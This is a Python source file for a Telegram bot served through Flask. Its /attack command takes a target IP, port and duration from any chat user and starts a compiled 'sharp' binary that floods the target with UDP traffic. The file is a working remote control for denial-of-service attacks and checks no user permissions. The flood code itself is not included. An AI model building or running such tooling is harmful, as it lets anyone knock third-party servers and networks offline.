import os
import telebot
import subprocess
import logging
from flask import Flask, request

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Load the Telegram bot token from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

# Flask app to handle webhook requests
app = Flask(__name__)

# Start polling for bot updates in a separate thread
def start_polling():
    try:
        logger.info("Starting bot polling...")
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Error occurred while polling: {e}")
        start_polling()  # Restart polling if an error occurs

# Handle the /attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        # Extract the IP, port, and duration from the command
        command_parts = message.text.split()
        
        # Ensure the correct number of parameters are provided
        if len(command_parts) != 4:
            bot.reply_to(message, "Usage: /attack <IP> <PORT> <DURATION>")
            return
        
        _, ip, port, duration = command_parts
        port = int(port)
        duration = int(duration)

        # Validate IP and port before running the attack
        if not (ip and 0 < port < 65535):
            bot.reply_to(message, "Invalid IP or port number. Please provide a valid IP and port.")
            return

        # Execute the sharp program (compiled from sharp.c) as a subprocess
        logger.info(f"Starting attack on {ip}:{port} for {duration} seconds.")
        subprocess.Popen(["./sharp", ip, str(port), str(duration)])

        # Send confirmation message
        bot.reply_to(message, f"UDP flood started on {ip}:{port} for {duration} seconds.")

    except ValueError:
        # Handle the case when conversion to integer fails
        bot.reply_to(message, "Error: Port and Duration must be integers.")
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        bot.reply_to(message, f"Error: {str(e)}")

# Flask route to handle incoming webhooks
@app.route('/' + BOT_TOKEN, methods=['POST'])
def receive_update():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

if __name__ == "__main__":
    # Start polling in a separate thread for bot updates
    from threading import Thread
    polling_thread = Thread(target=start_polling)
    polling_thread.daemon = True
    polling_thread.start()

    # Start Flask web server to listen for webhook requests
    logger.info("Starting Flask server...")
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
